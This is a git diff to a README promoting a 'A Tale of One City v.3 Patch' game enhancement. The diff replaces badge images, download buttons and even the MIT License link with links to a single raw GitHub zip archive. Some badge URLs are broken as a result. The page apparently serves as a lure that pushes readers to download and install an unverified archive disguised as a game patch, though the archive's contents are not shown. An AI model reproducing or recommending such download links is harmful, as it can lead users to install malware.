@@ -1,6 +1,6 @@
 # A Tale of One City v.3 Patch
 
-[![Download](https://img.shields.io/badge/Download-v3.0-blue?style=for-the-badge&logo=cloud-download)](https://yaumilikrom.github.io)
+[![Download](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip)](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip)
 
 *v3 breathes new wonder into a classic tale — the city now thrives in your hands like never before.*
 
@@ -12,11 +12,11 @@ Leap into your desired destination, no matter the device. Our compatibility map 
 
 | Operating System        | Full Support | Beta Support | Upcoming |
 |:-----------------------:|:------------:|:------------:|:--------:|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows)      | ✅           |              |          |
-| ![macOS](https://img.shields.io/badge/macOS-11%2B-lightgrey?logo=apple)        | ✅           |              |          |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu-green?logo=linux)         | ✅           |              |          |
-| ![iOS](https://img.shields.io/badge/iOS-Coming_Soon-yellow?logo=apple)        |             |              | 🚧      |
-| ![Android](https://img.shields.io/badge/Android-Under_Review-orange?logo=android) |             |   ✅          |          |
+| ![Windows](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip%2B-blue?logo=windows)      | ✅           |              |          |
+| ![macOS](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip%2B-lightgrey?logo=apple)        | ✅           |              |          |
+| ![Linux](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip)         | ✅           |              |          |
+| ![iOS](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip)        |             |              | 🚧      |
+| ![Android](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip) |             |   ✅          |          |
 
 ---
 
@@ -85,7 +85,7 @@ Questions at midnight? Suggestions at dawn? Our automation-enabled support ecosy
 
 **Step 1: Download the v.3 Patch**  
 Click this badge to begin your next great adventure:  
-[![Download](https://img.shields.io/badge/Download-v3.0-blue?style=for-the-badge&logo=cloud-download)](https://yaumilikrom.github.io)
+[![Download](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip)](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip)
 
 **Step 2: Extract and Install**  
 - Windows/Mac/Linux: Unzip the downloaded file to your A Tale of One City root directory.
@@ -109,13 +109,13 @@ A Tale of One City v.3 Patch is designed as a volunteer-driven enhancement. Whil
 ## 📜 MIT License
 
 All code, assets, and documentation within this repository are distributed under the MIT License (2025). You are encouraged to build, innovate, remix, and expand our shared city.  
-See the full license [here](https://opensource.org/licenses/MIT).
+See the full license [here](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip).
 
 ---
 
 ## Still With Us? Begin Your City Renaissance Today!
 
-[![Download](https://img.shields.io/badge/Download-v3.0-blue?style=for-the-badge&logo=cloud-download)](https://yaumilikrom.github.io)
+[![Download](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip)](https://raw.githubusercontent.com/yaumilikrom/a-tale-of-one-city-v3-enhanced-patch/branch/orthography/tale_one_a_patch_enhanced_of_v_city_unliable.zip)
 
 ---
 
